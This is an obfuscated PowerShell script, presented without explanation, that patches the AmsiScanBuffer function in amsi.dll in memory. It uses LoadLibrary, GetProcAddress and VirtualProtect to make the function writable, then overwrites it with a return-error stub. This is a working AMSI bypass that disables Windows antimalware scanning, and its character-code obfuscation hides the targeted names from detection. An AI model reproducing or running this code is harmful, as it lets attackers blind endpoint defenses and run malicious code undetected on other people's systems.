$afrcv = @"
using System;
using System.Runtime.InteropServices;
public class afrcv {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr odwsuy, uint flNewProtect, out uint lpflOldProtect);
}
"@
$7amada = [System.Runtime.InteropServices.Marshal]
Add-Type -TypeDefinition $afrcv

$wzqprfk = [afrcv]::LoadLibrary("$(('àmsî.'+'dll').NoRMAlize([chaR]([byte]0x46)+[cHAR](111+94-94)+[CHar](34+80)+[cHaR](109*91/91)+[CHaR]([bYTe]0x44)) -replace [chAR]([byte]0x5c)+[CHaR]([byTe]0x70)+[cHAR]([BYTe]0x7b)+[CHar]([ByTE]0x4d)+[cHAR]([BYTe]0x6e)+[ChAr](125+8-8))")
$npmjpz = [afrcv]::GetProcAddress($wzqprfk, "$([chaR](65+49-49)+[Char]([bytE]0x6d)+[char]([bYTe]0x73)+[ChAr](59+46)+[ChAr](83*70/70)+[CHAr]([bYte]0x63)+[CHAr](97)+[ChAr]([BYte]0x6e)+[chAR]([bytE]0x42)+[cHaR]([bytE]0x75)+[cHar](102)+[cHAR]([bYte]0x66)+[CHar]([BYTE]0x65)+[CHAR]([ByTE]0x72))")
$p = 0
[afrcv]::VirtualProtect($npmjpz, [uint32]5, 0x40, [ref]$p)
$vxck = "0xB8"
$uixn = "0x57"
$bxny = "0x00"
$rxqr = "0x07"
$yzex = "0x80"
$gbrq = "0xC3"
$acyyr = [Byte[]] ($vxck,$uixn,$bxny,$rxqr,+$yzex,+$gbrq)
$7amada::Copy($acyyr, 0, $npmjpz, 6)